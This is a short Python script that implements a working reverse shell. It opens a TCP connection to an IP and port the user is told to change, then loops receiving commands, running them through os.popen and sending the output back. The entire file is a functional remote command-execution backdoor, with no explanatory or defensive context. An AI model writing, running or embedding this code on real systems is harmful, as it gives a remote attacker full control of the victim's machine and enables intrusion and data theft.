import socket
import os

new_request = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
new_request.connect(('127.0.0.1', 4444))  #change ip and port
new_request.send("connection made ... \n ".encode())

while True:
    b = new_request.send(">>".encode())
    cmd = new_request.recv(1000).decode()
    command = os.popen(cmd).read()
    new_request.send(command.encode())

